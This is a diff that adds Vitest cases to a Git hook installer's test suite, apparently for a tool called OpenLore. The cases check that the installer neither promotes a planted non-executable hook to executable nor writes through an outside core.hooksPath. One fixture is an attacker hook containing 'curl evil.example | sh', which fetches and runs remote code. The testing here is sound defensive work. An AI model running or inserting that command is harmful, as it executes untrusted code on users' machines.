@@ -538,6 +538,52 @@ describe('effective Git hook delivery', () => {
     expect(warning).toHaveBeenCalledWith(expect.stringMatching(/cannot be inspected safely/));
   });
 
+  it('refuses to republish a non-executable pre-existing hook as executable', async () => {
+    const root = await repository('openlore-mode-promotion-');
+    const hookPath = join(root, '.git', 'hooks', 'pre-commit');
+    // What an archive-delivered repository can ship: attacker shell in a hook Git
+    // ignores today, because it is not executable.
+    const smuggled = '#!/bin/sh\ncurl evil.example | sh\n';
+    await writeFile(hookPath, smuggled, { mode: 0o644 });
+    const warning = vi.spyOn(logger, 'warning').mockImplementation(() => {});
+
+    await installEnforcementHook(root);
+
+    expect(await readFile(hookPath, 'utf-8')).toBe(smuggled);
+    expect((await stat(hookPath)).mode & 0o111).toBe(0);
+    expect(warning).toHaveBeenCalledWith(expect.stringMatching(/not executable and OpenLore did not write it/i));
+  });
+
+  it('still refreshes a non-executable hook that holds nothing but OpenLore blocks', async () => {
+    const root = await repository('openlore-mode-promotion-ours-');
+    const hookPath = join(root, '.git', 'hooks', 'pre-commit');
+    await writeFile(
+      hookPath,
+      '#!/bin/sh\n# openlore-drift-hook\necho old-hook\n# end-openlore-drift-hook\n',
+      { mode: 0o644 },
+    );
+
+    await installDriftHook(root);
+
+    expect(await readFile(hookPath, 'utf-8')).toContain('DRIFT_VERDICT=');
+    expect((await stat(hookPath)).mode & 0o100).toBe(0o100);
+  });
+
+  it('refuses a core.hooksPath pointing outside the repository', async () => {
+    const root = await repository('openlore-unconfined-hooks-');
+    const outside = await mkdtemp(join(tmpdir(), 'openlore-victim-bin-'));
+    created.push(outside);
+    await execFileAsync('git', ['config', 'core.hooksPath', outside], { cwd: root });
+    const warning = vi.spyOn(logger, 'warning').mockImplementation(() => {});
+    const success = vi.spyOn(logger, 'success').mockImplementation(() => {});
+
+    await installEnforcementHook(root);
+
+    expect(warning).toHaveBeenCalledWith(expect.stringMatching(/outside this repository/i));
+    expect(success).not.toHaveBeenCalled();
+    await expect(readFile(join(outside, 'pre-commit'), 'utf-8')).rejects.toThrow();
+  });
+
   it('preserves boundary whitespace in Git paths while keeping logs single-line', async () => {
     const root = await repository('openlore-whitespace-hooks-');
     const relativeHooksPath = ' hooks with spaces ';
